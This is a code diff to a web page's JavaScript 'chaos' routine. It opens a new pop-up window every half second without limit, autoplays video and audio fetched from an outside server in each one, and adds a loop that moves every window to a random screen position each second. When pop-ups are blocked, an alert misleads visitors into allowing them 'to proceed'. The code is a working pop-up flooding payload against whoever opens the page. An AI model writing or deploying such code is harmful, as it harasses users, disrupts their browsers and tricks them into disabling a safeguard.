@@ -249,12 +249,15 @@ function startChaos() {
     // Start spawning chaos windows indefinitely
     chaosInterval = setInterval(() => {
         spawnChaosWindow();
-    }, 500); // Adjust the interval as needed (e.g., every 0.5 seconds)
+    }, 500); // Adjust the interval as needed
+
+    // Also start moving the existing chaos windows
+    moveChaosWindows();
 }
 
 // Function to spawn a single chaos window
 function spawnChaosWindow() {
-    const chaosWindow = window.open('', '_blank', 'width=640,height=360');
+    const chaosWindow = window.open('', '', 'width=400,height=300');
     if (chaosWindow) {
         chaosWindow.document.write(`
             <!DOCTYPE html>
@@ -283,14 +286,10 @@ function spawnChaosWindow() {
                     <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
                 </audio>
                 <script>
-                    // Try to play video and audio
+                    // Play video and audio
                     const video = document.getElementById('chaosVideo');
                     const audio = document.getElementById('chaosAudio');
 
-                    // Unmute video
-                    video.muted = false;
-
-                    // Play video and audio
                     video.play().catch(function(error) {
                         console.log('Video play error:', error);
                     });
@@ -303,9 +302,10 @@ function spawnChaosWindow() {
             </html>
         `);
         chaosWindow.focus();
+
         // Move the window to a random position
-        const width = 640;
-        const height = 360;
+        const width = 400;
+        const height = 300;
         const x = Math.floor(Math.random() * (screen.width - width));
         const y = Math.floor(Math.random() * (screen.height - height));
         chaosWindow.moveTo(x, y);
@@ -322,6 +322,25 @@ function spawnChaosWindow() {
         alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
         stopChaos(); // Stop attempting to spawn windows
     }
+}
+
+// Function to move chaos windows randomly
+function moveChaosWindows() {
+    setInterval(() => {
+        chaosWindows.forEach((chaosWindow, index) => {
+            if (!chaosWindow.closed) {
+                // Calculate new random position
+                const width = 400;
+                const height = 300;
+                const x = Math.floor(Math.random() * (screen.width - width));
+                const y = Math.floor(Math.random() * (screen.height - height));
+                chaosWindow.moveTo(x, y);
+            } else {
+                // Remove closed windows from the array
+                chaosWindows.splice(index, 1);
+            }
+        });
+    }, 1000); // Move every second
 }
 
 // Function to stop chaos (if needed)
